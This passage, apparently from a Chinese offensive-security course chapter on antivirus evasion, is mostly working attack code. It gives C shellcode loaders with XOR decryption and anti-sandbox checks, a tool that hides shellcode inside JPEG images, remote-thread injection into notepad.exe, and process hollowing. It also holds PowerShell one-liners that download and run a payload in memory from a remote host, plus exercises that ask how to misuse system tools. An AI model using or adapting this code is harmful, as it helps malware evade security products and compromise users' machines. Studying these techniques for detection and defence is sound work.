- 或者穿插一些正常的操作

**3. 内存属性要注意**
- PAGE_EXECUTE_READWRITE 很可疑
- 可以先分配读写，再改到执行
- 或者用其他方式分配可执行内存

**4. 加入反调试、反沙箱**
- 检测调试器
- 检测沙箱
- 检测虚拟机
- 检测到了就不执行或者执行假代码

**5. 模拟正常程序行为**
- 不要一上来就执行Shellcode
- 先做一些正常的操作
- 窗口、消息循环什么的

**6. 代码混淆**
- 加载器本身的代码也要混淆
- 加花指令
- 字符串加密
- 等价指令替换

### 63.12.3 一个简单的加载器框架

```c
#include <windows.h>
#include <stdio.h>

// 加密后的Shellcode（XOR加密示例）
unsigned char encrypted_shellcode[] = { /* ... */ };
unsigned char key = 0x42;
int sc_len = sizeof(encrypted_shellcode);

// 解密函数
void decrypt(unsigned char* data, int len, unsigned char k) {
    for (int i = 0; i < len; i++) {
        data[i] ^= k;
    }
}

// 反沙箱检查
BOOL check_environment() {
    // 检查内存大小
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 2 * 1024 * 1024 * 1024) {
        return FALSE;  // 内存小于2G，可能是沙箱
    }

    // 检查CPU核心数
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return FALSE;
    }

    // 检查是否被调试
    if (IsDebuggerPresent()) {
        return FALSE;
    }

    // 可以加更多检查...

    return TRUE;
}

int main() {
    // 1. 环境检查
    if (!check_environment()) {
        return 0;  // 检测到沙箱/调试，直接退出
    }

    // 2. 先做点正常的事（伪装）
    MessageBox(NULL, "Hello World!", "Info", MB_OK);

    // 3. 分配内存
    unsigned char* buf = (unsigned char*)VirtualAlloc(
        NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // 先分配读写
    );

    // 4. 解密Shellcode到内存
    memcpy(buf, encrypted_shellcode, sc_len);
    decrypt(buf, sc_len, key);

    // 5. 修改内存属性为可执行
    DWORD old_protect;
    VirtualProtect(buf, sc_len, PAGE_EXECUTE_READ, &old_protect);

    // 6. 执行Shellcode
    ((void(*)())buf)();

    // 7. 清理（可选）
    VirtualFree(buf, 0, MEM_RELEASE);

    return 0;
}
```

这是一个最基础的加载器框架。
实际使用时，
需要根据情况
进行各种优化和增强。

### 63.12.4 加载器的发展方向

- **更隐蔽的执行方式** - 不用CreateThread，用回调、APC等
- **直接系统调用** - 绕过用户态Hook
- **Unhooking** - 去掉EDR的钩子
- **更复杂的加密** - 对抗静态分析
- **对抗EDR** - 更高级的绕过技术
- **AI对抗** - 对抗机器学习检测

---

## 📚 案例1：Shellcode异或加密免杀

### 场景描述
写一个简单的Shellcode加载器，
用XOR加密Shellcode，
测试免杀效果。

### 第一步：准备Shellcode

用msfvenom生成：
```bash
msfvenom -p windows/messagebox \
  TEXT="Hello from Shellcode!" \
  TITLE="Test" \
  -f c
```

得到C格式的Shellcode数组。

### 第二步：加密Shellcode

写一个加密工具：
```c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("Usage: %s <input_file> <key_hex>\n", argv[0]);
        return 1;
    }

    // 读取Shellcode文件
    FILE* f = fopen(argv[1], "rb");
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    unsigned char* buf = malloc(len);
    fread(buf, 1, len, f);
    fclose(f);

    // 加密
    unsigned char key = (unsigned char)strtol(argv[2], NULL, 16);
    for (int i = 0; i < len; i++) {
        buf[i] ^= key;
    }

    // 输出C数组格式
    printf("unsigned char encrypted_shellcode[] = {");
    for (int i = 0; i < len; i++) {
        if (i % 16 == 0) printf("\n    ");
        printf("0x%02X, ", buf[i]);
    }
    printf("\n};\n");
    printf("int sc_len = %d;\n", len);
    printf("unsigned char key = 0x%02X;\n", key);

    free(buf);
    return 0;
}
```

使用：
```bash
./encrypt shellcode.bin 42
# 输出加密后的C数组
```

### 第三步：写加载器

```c
#include <windows.h>
#include <stdio.h>

// 加密后的Shellcode
unsigned char encrypted_shellcode[] = {
    // ... 加密后的字节 ...
};
int sc_len = sizeof(encrypted_shellcode);
unsigned char key = 0x42;

int main() {
    // 1. 分配内存（先读写）
    LPVOID mem = VirtualAlloc(
        NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    // 2. 复制并解密
    unsigned char* p = (unsigned char*)mem;
    for (int i = 0; i < sc_len; i++) {
        p[i] = encrypted_shellcode[i] ^ key;
    }

    // 3. 改成可执行
    DWORD old;
    VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old);

    // 4. 执行
    ((void(*)())mem)();

    // 5. 清理
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

### 第四步：编译测试

```bash
# 用mingw或MSVC编译
gcc loader.c -o loader.exe

# 测试运行
# 应该能正常弹出消息框
```

### 第五步：免杀效果测试

```
原始Shellcode硬编码：检出率约 80-90%
XOR加密后：检出率约 30-50%
（取决于具体的Shellcode和加密方式）
```

### 经验总结
1. XOR加密是最简单的Shellcode免杀方法
2. 效果比直接硬编码好不少
3. 但XOR特征也比较明显，高级杀软能识别
4. 可以配合自定义算法、花指令等增强效果
5. 这只是入门，更高级的免杀需要更多技术

---

## 📚 案例2：分离免杀实战（图片隐写）

### 场景描述
把Shellcode藏在图片里，
加载器从图片中读取Shellcode，
实现分离免杀。

### 第一步：准备图片和Shellcode

找一张正常的图片，
比如风景照 `photo.jpg`。

准备好要藏的Shellcode。

### 第二步：把Shellcode藏进图片

最简单的方法——附加在图片末尾：

```c
// embed.c - 把Shellcode藏进图片
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("Usage: %s <image.jpg> <shellcode.bin> <output.jpg>\n", argv[0]);
        return 1;
    }

    // 读取图片
    FILE* fimg = fopen(argv[1], "rb");
    fseek(fimg, 0, SEEK_END);
    long img_len = ftell(fimg);
    fseek(fimg, 0, SEEK_SET);
    unsigned char* img_buf = malloc(img_len);
    fread(img_buf, 1, img_len, fimg);
    fclose(fimg);

    // 读取Shellcode
    FILE* fsc = fopen(argv[2], "rb");
    fseek(fsc, 0, SEEK_END);
    long sc_len = ftell(fsc);
    fseek(fsc, 0, SEEK_SET);
    unsigned char* sc_buf = malloc(sc_len);
    fread(sc_buf, 1, sc_len, fsc);
    fclose(fsc);

    // 写入输出文件
    FILE* fout = fopen(argv[3], "wb");
    fwrite(img_buf, 1, img_len, fout);
    fwrite(sc_buf, 1, sc_len, fout);
    // 最后写Shellcode的长度，方便读取
    fwrite(&sc_len, sizeof(int), 1, fout);
    fclose(fout);

    printf("Done! Shellcode embedded.\n");
    printf("Image size: %ld\n", img_len);
    printf("Shellcode size: %ld\n", sc_len);

    free(img_buf);
    free(sc_buf);
    return 0;
}
```

使用：
```bash
./embed photo.jpg shellcode.bin output.jpg
```

图片看起来还是正常的，
用看图软件能正常打开。

### 第三步：写加载器

```c
// loader.c - 从图片读取Shellcode并执行
#include <windows.h>
#include <stdio.h>

int main() {
    // 1. 读取图片文件
    FILE* f = fopen("output.jpg", "rb");
    fseek(f, 0, SEEK_END);
    long file_len = ftell(f);

    // 2. 从末尾读取Shellcode长度
    int sc_len = 0;
    fseek(f, file_len - sizeof(int), SEEK_SET);
    fread(&sc_len, sizeof(int), 1, f);

    // 3. 读取Shellcode
    fseek(f, file_len - sizeof(int) - sc_len, SEEK_SET);
    unsigned char* sc_buf = malloc(sc_len);
    fread(sc_buf, 1, sc_len, f);
    fclose(f);

    // 4. 解密Shellcode（如果加密了的话）
    // ... 解密代码 ...

    // 5. 分配内存并执行
    LPVOID mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, sc_buf, sc_len);
    ((void(*)())mem)();

    free(sc_buf);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}
```

### 第四步：测试

```
1. 准备好output.jpg和loader.exe
2. 运行loader.exe
3. 确认Shellcode能正常执行
4. 用杀软扫描loader.exe和output.jpg
```

### 效果分析

```
加载器（loader.exe）：
- 里面没有Shellcode
- 看起来就是一个普通的文件读取程序
- 检出率低很多

图片（output.jpg）：
- 看起来就是一张正常的图片
- 大部分杀软不会深度扫描图片
- 就算扫描到末尾有数据，也不一定认为是恶意的

组合起来：
- 分离免杀效果不错
- 加载器很干净
- Shellcode藏在图片里
```

### 进阶：LSB隐写

如果想更隐蔽，
可以用LSB隐写，
把Shellcode藏在
图片像素的最低位。

这样图片看起来
完全正常，
文件大小也不变。
需要专门的工具才能提取。

### 经验总结
1. 分离免杀效果很好，加载器非常干净
2. 图片隐写是最简单的分离方式
3. 可以配合加密，Shellcode先加密再藏进去
4. 还可以藏在音频、文本、网络等地方
5. 分离免杀 + 加密 + 注入 = 强力组合

---

## 📚 案例3：远程线程注入实战

### 场景描述
实现经典的CreateRemoteThread远程线程注入，
把Shellcode注入到notepad.exe中。

### 完整代码

```c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// 加密后的Shellcode
unsigned char encrypted_shellcode[] = { /* ... */ };
unsigned char key = 0x42;
int sc_len = sizeof(encrypted_shellcode);

// 根据进程名找PID
DWORD find_pid(const char* proc_name) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, proc_name) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

int main() {
    // 1. 找到notepad.exe的PID
    DWORD pid = find_pid("notepad.exe");
    if (pid == 0) {
        printf("notepad.exe not found!\n");
        return 1;
    }
    printf("Found PID: %d\n", pid);

    // 2. 解密Shellcode
    unsigned char* shellcode = malloc(sc_len);
    for (int i = 0; i < sc_len; i++) {
        shellcode[i] = encrypted_shellcode[i] ^ key;
    }

    // 3. 打开目标进程
    HANDLE hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );
    if (hProcess == NULL) {
        printf("OpenProcess failed: %d\n", GetLastError());
        free(shellcode);
        return 1;
    }

    // 4. 在目标进程分配内存
    LPVOID remote_mem = VirtualAllocEx(
        hProcess,
        NULL,
        sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE  // 先读写
    );
    if (remote_mem == NULL) {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        free(shellcode);
        return 1;
    }

    // 5. 写入Shellcode
    SIZE_T written;
    WriteProcessMemory(
        hProcess,
        remote_mem,
        shellcode,
        sc_len,
        &written
    );

    // 6. 修改内存属性为可执行
    DWORD old_protect;
    VirtualProtectEx(
        hProcess,
        remote_mem,
        sc_len,
        PAGE_EXECUTE_READ,
        &old_protect
    );

    // 7. 创建远程线程执行
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remote_mem,
        NULL,
        0,
        NULL
    );
    if (hThread == NULL) {
        printf("CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(shellcode);
        return 1;
    }

    printf("Injection success!\n");

    // 8. 等待线程结束（可选）
    WaitForSingleObject(hThread, INFINITE);

    // 9. 清理
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    free(shellcode);

    return 0;
}
```

### 使用步骤

```
1. 先打开一个记事本（notepad.exe）
2. 运行注入程序
3. 观察记事本中是否执行了Shellcode
4. 用杀软扫描注入程序
5. 观察杀软会不会检测到注入行为
```

### 注意事项

1. **权限问题** - 注入高权限进程需要管理员权限
2. **架构问题** - 32位注入32位，64位注入64位
3. **目标进程** - 选正常的系统进程更隐蔽
4. **注入方式** - CreateRemoteThread最经典但也最容易被检测
5. **实际使用时** - 应该用更隐蔽的注入方式

### 经验总结
1. 远程线程注入是最经典的注入方式
2. 实现简单，适合学习
3. 但太经典了，容易被检测
4. 实际使用建议用更隐蔽的注入方式
5. 注入可以配合分离免杀、加密等技术，效果更好

---

## 📚 案例4：进程掏空注入演示

### 场景描述
实现一个简单的进程掏空注入，
创建一个正常进程，
然后替换成我们的Shellcode。

### 基本步骤

```
1. 创建一个挂起的进程（比如svchost.exe）
2. 获取进程的上下文信息
3. 读取目标进程内存
4. 写入Shellcode
5. 修改线程上下文，指向Shellcode
6. 恢复线程执行
```

### 简化版代码

```c
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = { /* ... */ };
int sc_len = sizeof(shellcode);

int main() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. 创建一个挂起的进程
    if (!CreateProcess(
        "C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,  // 挂起创建
        NULL, NULL, &si, &pi
    )) {
        printf("CreateProcess failed: %d\n", GetLastError());
        return 1;
    }

    printf("Process created (suspended). PID: %d\n", pi.dwProcessId);

    // 2. 获取线程上下文
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("GetThreadContext failed: %d\n", GetLastError());
        goto cleanup;
    }

    // 3. 在目标进程分配内存
    LPVOID remote_mem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remote_mem) {
        printf("VirtualAllocEx failed: %d\n", GetLastError());
        goto cleanup;
    }

    // 4. 写入Shellcode
    SIZE_T written;
    WriteProcessMemory(
        pi.hProcess,
        remote_mem,
        shellcode,
        sc_len,
        &written
    );

    // 5. 修改线程上下文，让EIP指向Shellcode
#ifdef _WIN64
    ctx.Rip = (DWORD64)remote_mem;
#else
    ctx.Eip = (DWORD)remote_mem;
#endif

    // 6. 设置线程上下文
    SetThreadContext(pi.hThread, &ctx);

    // 7. 恢复线程
    ResumeThread(pi.hThread);

    printf("Process hollowing success!\n");

    // 等待进程结束（可选）
    WaitForSingleObject(pi.hProcess, INFINITE);

cleanup:
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

::: warning 注意
这是一个简化版的进程掏空，
主要用于学习原理。
真正的进程掏空要更复杂，
需要处理PE加载、重定位、导入表等。

完整的Process Hollowing
是替换整个PE文件，
不是只替换Shellcode。
:::

### 效果分析

```
从外面看：
- 进程名是notepad.exe
- 路径是C:\Windows\System32\notepad.exe
- 是微软签名的程序

但实际：
- 执行的是我们的Shellcode

隐蔽性比直接运行好很多。
```

### 经验总结
1. 进程掏空是一种很隐蔽的注入技术
2. 进程名和路径都是正常的，欺骗性强
3. 完整的实现比较复杂，要处理PE加载
4. 有很多变种（Doppelgänging、Herpaderping等）
5. 是高级免杀的重要技术之一

---

## 📚 案例5：PowerShell无文件攻击

### 场景描述
用PowerShell实现
无文件攻击，
文件不落地，
直接从内存执行。

### 方法一：下载执行

```powershell
# 从远程下载脚本，直接在内存中执行
powershell -nop -w hidden -c "IEX ((new-object net.webclient).DownloadString('http://x.x.x.x/payload.ps1'))"
```

**参数说明：**
- `-nop` - 不加载配置文件
- `-w hidden` - 隐藏窗口
- `-c` - 执行命令
- `IEX` - Invoke-Expression，执行字符串
- `Net.WebClient` - .NET的Web客户端，下载字符串

**特点：**
- 没有文件落地（PowerShell是系统自带的）
- Payload在内存中
- 但是会有PowerShell日志
- 网络连接可以被监控

### 方法二：Base64编码

```powershell
# 把脚本Base64编码，用-EncodedCommand参数执行
powershell -nop -w hidden -enc <base64编码的脚本>
```

**为什么要编码？**
- 避免特殊字符的问题
- 增加一点检测难度（但不多）

### 方法三：反射加载

```powershell
# 下载.NET程序集，反射加载执行
$bytes = (New-Object Net.WebClient).DownloadData('http://x.x.x.x/payload.exe')
$assembly = [System.Reflection.Assembly]::Load($bytes)
$assembly.EntryPoint.Invoke($null, @($null))
```

**特点：**
- 加载.NET程序集，完全在内存
- 不写文件
- 比脚本更难检测一些

### 方法四：Shellcode执行

```powershell
# PowerShell执行Shellcode
$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("kernel32.dll")]public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);'

$win32 = Add-Type -member $code -name "Win32" -namespace Win32Functions -passthru

# 你的Shellcode（Base64编码）
$sc = [Convert]::FromBase64String("Base64编码的Shellcode")

$addr = $win32::VirtualAlloc(0x1000, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
$handle = $win32::CreateThread(0, 0, $addr, 0, 0, 0)
$win32::WaitForSingleObject($handle, 0xFFFFFFFF)
```

### 方法五：无文件持久化

利用WMI事件订阅
或注册表
实现无文件持久化。

```powershell
# 示例：WMI事件订阅持久化（简化）
# 当某个事件触发时，执行命令
# 配置存在WMI仓库里，没有文件
```

### 为什么PowerShell无文件很流行？

1. **系统自带** - 所有Windows都有PowerShell
2. **功能强大** - 能调用.NET、能执行Shellcode、能操作WMI等
3. **无文件** - 可以做到完全不落地
4. **灵活** - 各种攻击方式都能实现
5. **难检测** - 脚本是动态的，传统杀软不容易检测

### 对抗与检测

当然，
杀软和EDR也在加强
对PowerShell的检测：
- AMSI（反恶意软件扫描接口）
- PowerShell日志
- 脚本块日志
- 行为检测

所以又有了
各种绕过AMSI的技术。
（下一章会讲）

### 经验总结
1. PowerShell是无文件攻击的利器
2. 方式多样，从简单到复杂都有
3. 系统自带，免杀效果不错
4. 但AMSI等检测也越来越强
5. 需要配合绕过AMSI等技术

---

## ✏️ 习题（20道）

### 一、选择题（5题）

1. 以下哪种不是常见的Shellcode加密方式？
   - A. XOR加密
   - B. AES加密
   - C. MD5加密
   - D. Base64编码

2. 进程掏空（Process Hollowing）的主要特点是？
   - A. 注入DLL文件
   - B. 创建正常进程后替换其中的代码
   - C. 用PowerShell执行
   - D. 只修改注册表

3. 以下哪个不属于LOLBins（白利用工具）？
   - A. rundll32.exe
   - B. mshta.exe
   - C. calc.exe
   - D. certutil.exe

4. 无文件攻击（Fileless）的核心特点是？
   - A. 速度快
   - B. 没有恶意文件落地磁盘
   - C. 体积小
   - D. 功能强

5. 反射型DLL注入和普通DLL注入的主要区别是？
   - A. 注入的目标进程不同
   - B. 反射型DLL手动加载，不用LoadLibrary，也不用文件落地
   - C. 反射型DLL只能注入到系统进程
   - D. 没有区别

### 二、填空题（5题）

6. Shellcode免杀的核心思路是：__________Shellcode + 自定义__________。

7. 把Shellcode和加载器分开放的免杀技术叫做__________免杀。

8. 最经典的进程注入方式是__________注入。

9. 完全不落地、只在内存中执行的攻击方式叫做__________攻击。

10. 利用系统自带的正常工具来执行恶意操作的技术叫做__________，英文简称LOLBins。

### 三、简答题（5题）

11. 什么是Shellcode免杀？它的基本原理是什么？

12. 什么是分离免杀？有哪些常见的分离方式？

13. 什么是进程注入？列举至少5种进程注入方式。

14. 什么是无文件攻击？为什么无文件攻击难以检测？

15. 什么是钩子（Hook）？杀软为什么要Hook API？

### 四、实操题（5题）

16. 写一个简单的Shellcode加载器，用XOR加密Shellcode，并测试免杀效果。

17. 实现一个简单的远程线程注入（CreateRemoteThread），把Shellcode注入到notepad.exe中。

18. 尝试用PowerShell实现无文件执行Shellcode。

19. 查找并学习3个LOLBin的用法，思考如何用它们做坏事。

20. 实现一个简单的分离免杀（比如把Shellcode藏在图片末尾，加载器从图片读取并执行）。

---

::: tip 本章小结
这一章我们学习了进阶免杀技术。

主要内容：
1. Shellcode免杀原理
2. Shellcode加密/编码（XOR、AES、Base64、自定义）
3. 分离免杀技术（图片隐写、音频隐写、网络分离等）
4. 进程注入技术（10种注入方式）
5. 经典远程线程注入（CreateRemoteThread）
6. 进程掏空（Process Hollowing）
7. DLL注入技术
8. 反射型DLL注入
9. 无文件攻击技术（Fileless Malware、LOLBins）
10. 其他注入方式（APC、线程劫持、映射注入等）
11. 钩子检测与绕过
12. 免杀加载器开发入门
13. 5个实战案例
14. 20道习题

进阶免杀技术
比基础免杀威力大很多，
也是实战中最常用的。

下一章我们会学习
更高级的免杀技术——
直接系统调用、Unhooking、
AMSI绕过、EDR对抗等。

继续加油！
:::
